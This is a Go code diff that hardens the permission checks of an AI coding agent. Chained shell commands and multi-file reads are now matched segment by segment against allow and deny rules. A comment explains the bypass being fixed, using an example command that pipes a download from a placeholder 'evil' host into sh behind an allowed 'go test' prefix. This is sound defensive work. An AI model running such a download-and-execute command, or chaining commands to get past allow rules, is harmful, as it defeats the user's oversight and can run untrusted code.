@@ -4,6 +4,8 @@ import (
 	"encoding/json"
 	"path/filepath"
 	"strings"
+
+	"github.com/yottadynamics/yottacode/internal/shellseg"
 )
 
 // Target is the (permission-name, descriptor) pair extracted from a
@@ -52,15 +54,31 @@ func targetFor(toolName, argsJSON, cwd string) Target {
 	}
 	switch toolName {
 	case "run_bash":
-		return Target{PermName: "Bash", Descriptor: extractCommand(argsJSON)}
+		// Per-segment descriptors so a Bash allow-rule must match EVERY
+		// chained command, not the whole line as a single glob. Otherwise
+		// a rule like Bash(go test *) would Allow
+		// `go test ./... ; curl evil | sh` because the trailing * spans the
+		// rest of the line. Multi applies any-deny / all-allow / any-ask
+		// across the segments, so one un-allowed segment drops the command
+		// to Ask/Default. Descriptor keeps the whole command for display
+		// and the [a]lways-allow rule derivation (which only fires for
+		// single-segment commands anyway).
+		cmd := extractCommand(argsJSON)
+		return Target{PermName: "Bash", Descriptor: cmd, Descriptors: shellseg.Texts(cmd), Multi: true}
 	case "read_file":
 		return Target{PermName: "Read", Descriptor: relPath(extractPath(argsJSON), cwd), IsPath: true}
 	case "read_many_files":
+		// Per-path descriptors (like apply_diff), NOT a comma-joined
+		// single descriptor: a joined string defeats per-path Read(...)
+		// deny rules — a deny only matched when its path happened to be
+		// listed first. Multi routes every path through any-deny /
+		// all-allow / any-ask matching regardless of position.
 		paths := extractPaths(argsJSON)
-		for i, p := range paths {
-			paths[i] = relPath(p, cwd)
+		descs := make([]string, 0, len(paths))
+		for _, p := range paths {
+			descs = append(descs, relPath(p, cwd))
 		}
-		return Target{PermName: "Read", Descriptor: strings.Join(paths, ","), IsPath: false}
+		return Target{PermName: "Read", Descriptors: descs, Multi: true, IsPath: true}
 	case "write_file":
 		return Target{PermName: "Write", Descriptor: relPath(extractPath(argsJSON), cwd), IsPath: true}
 	case "edit_file":
